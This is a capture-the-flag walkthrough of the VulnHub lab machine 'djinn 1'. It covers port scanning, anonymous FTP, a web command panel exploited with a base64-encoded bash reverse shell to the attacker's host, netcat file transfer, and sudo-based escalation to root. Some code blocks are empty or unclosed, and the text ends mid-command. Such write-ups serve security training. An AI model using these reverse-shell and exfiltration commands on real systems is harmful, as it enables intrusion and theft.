title: VulnHub - djinn 1
---

**Description:** The machine is VirtualBox as well as VMWare compatible. The DHCP will assign an IP automatically.

**Author:** 0xmzfr

**Operating System:** Linux

**Aim:** Read two flags (user and root) which is present in user.txt and root.txt respectively.

**Download:** [https://www.vulnhub.com/entry/djinn-1,397/](https://www.vulnhub.com/entry/djinn-1,397/)

## Information Gathering
### Host Discovery
We start on the local network discovering our target with netdiscover.

```bash
root@kali:~$ netdiscover -i vmnet1 -r 192.168.179.1/24 
 Currently scanning: Finished!   |   Screen View: Unique Hosts 
                                                               
 4 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 222 
 ________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname 
 ------------------------------------------------------------------------
 192.168.179.143 00:0c:29:ee:b5:bb      3     180  VMware, Inc. 
 192.168.179.254 00:50:56:e2:8b:9f      1      42  VMware, Inc.
```
### Port Scanning
Then I proceed to scan all TCP ports with nmap.

```bash
root@kali:~$ nmap -n -vv -T5 -p- 192.168.179.143 -oG nmap-tcp-ports.txt 
...
PORT     STATE    SERVICE REASON
21/tcp   open     ftp     syn-ack ttl 64
22/tcp   filtered ssh     port-unreach ttl 64
1337/tcp open     waste   syn-ack ttl 64
7331/tcp open     swx     syn-ack ttl 64
MAC Address: 00:0C:29:EE:B5:BB (VMware)
...
```

### Service Enumeration
With nmap I perform the enumeration of services and versions of open TCP ports, OS detection, script scanning, and traceroute.

```bash
root@kali:~$ nmap -n -vv -A -p21,1337,7331 192.168.179.143 -oN nmap-service-enum.txt
...
PORT     STATE SERVICE REASON         VERSION

### FTP Enumeration
The anonymous login is enabled, so I log in to this service and find three text files.

```bash
root@kali:~$ ftp 192.168.179.143

I download the files to my atacking machine.

```bash

```

I find possible credentials for the nitu user, a note about a game running on port 1337 and a message specifying that a user is going on holidays.

```bash
root@kali:~$ cat creds.txt 
nitu:81299
root@kali:~$ cat game.txt 
oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the 
final level and get the prize.
root@kali:~$ cat message.txt 
@nitish81299 I am going on holidays for few days, please take care of all the work. 
And do not mess up anything.
```

### Web Enumeration
Then I interact with the web service and not find nothing interesting, so I run gobuster to search for hidden files and directories. 

![](/assets/images/djinn/screenshot-1.png)

```bash
root@kali:~$ gobuster dir -u http://192.168.179.143:7331 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e
...
http://192.168.179.143:7331/wish                 (Status: 200) [Size: 385]
http://192.168.179.143:7331/genie                (Status: 200) [Size: 1676]
```
In the output we can see only two possible files, so I request for the wish file and it redirects me to a panel that allows executing system commands.

![](/assets/images/djinn/screenshot-2.png)

I execute the **id** command and this return the result, so it is possible to run commands.

![](/assets/images/djinn/screenshot-4.png)
  

## Exploitation
### Command Execution
Since it's not possible execute commands directly, we need to base64 encode our reverse shell.

```bash
root@kali:~$ echo "bash -i >& /dev/tcp/192.168.179.1/443 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3OS4xLzQ0MyAwPiYxCg==
```

We first need set up a netcat listener on port 443, then we copy our reverse shell encoded and paste it into the textbox along with the echo command, piping it to decode it and piping it to execute it with bash.

```bash
root@kali:~$ echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3OS4xLzQ0MyAwPiYxCg==" | base64 -d | bash
```
![](/assets/images/djinn/screenshot-5.png)

And we have a shell with www-data user permissions.

```bash
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.143] 37832
bash: cannot set terminal process group (652): Inappropriate ioctl for device
bash: no job control in this shell
www-data@djinn:/opt/80$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


Into the directory **/home/nitish/.dev** I found credentials for the nitish user.

```bash
www-data@djinn:/home/nitish/.dev$ ls
ls
creds.txt
www-data@djinn:/home/nitish/.dev$ cat creds.txt
cat creds.txt
nitish:p4ssw0rdStr3r0n9
```

Then I switch to the nitish user with the found credentials.

```bash
www-data@djinn:/home/nitish/.dev$ su nitish 
su: must be run from a terminal
www-data@djinn:/home/nitish/.dev$ python -c 'import pty;pty.spawn("/bin/bash")'
<.dev$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@djinn:/home/nitish/.dev$ su nitish
Password: p4ssw0rdStr3r0n9

nitish@djinn:~/.dev$ id
uid=1001(nitish) gid=1001(nitish) groups=1001(nitish)
```

By listing the sudo permissions, the nitish user can execute the genie binary with sudo as the sam user.

```bash
nitish@djinn:~$ sudo -l
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
```

To escalate to the **sam** user and get a shell I used the following instruction.

```bash
nitish@djinn:~$ sudo -u sam /usr/bin/genie -g god -e id -cmd
my man!!
$ id
uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
$ whoami
sam
$ bash
sam@djinn:~$ 
```



## Privilege Escalation
### Sudo Permissions
Enumerating for sudo permissions I found that the sam user can run the **lago** binary as the root user.

```bash
sam@djinn:~$ sudo -l
Matching Defaults entries for sam on djinn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sam may run the following commands on djinn:
    (root) NOPASSWD: /root/lago
```
I run the **lago** script with sudo permissions, but I can't find a way to get root. 

```bash
sam@djinn:/home/sam$ sudo /root/lago
sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
2
Choose a number between 1 to 100: 
Enter your number: /bin/sh
/bin/sh
Better Luck next time
```

Listing in the sam's home directory, I found a compiled python file, execute it, and I can see that it's related to the lago script.

```bash
sam@djinn:/home/sam$ ls -la
...
-rw-r--r-- 1 sam  sam    1749 Nov  7  2019 .pyc
...
```

Then I transfer this script to my machine, for this we firt set up a netcat listener on the attacking machine as shown: 

```bash
root@kali:~$ nc -vlnp 443 > pyc
listening on [any] 443 ...
```

And on the target machine we execute the following netcat command:

```bash
sam@djinn:/home/sam$ nc 192.168.179.1 443 < .pyc
```

Ones downloaded the file, we'll try to decompile it to be able to read the code in plain text. For This we first need install the **decompyle3** utility and then decompile it, as shown below:

```bash
root@kali:~$ pip3 install decompyle3

root@kali:~$ decompyle3 pyc
...
def guessit():
    num = randint(1, 101)
    print("Choose a number between 1 to 100: ")

    try:
        s = input("Enter your number: ") 
        if s == num:
            system("/bin/sh")

        else:
            print("Better Luck next time")
    except:
        print("Slow claps again")
...
```

As we can see in the previous result, this script generates a random number and then asks to the user for the generated number and if is true it will execute a /bin/sh, knowing how it works we can bypass this by inserting the word **num** where it asks us to enter a number from 1 to 100, and we get a root shell.

```bash
sam@djinn:/opt/80$ sudo /root/lago
sudo /root/lago
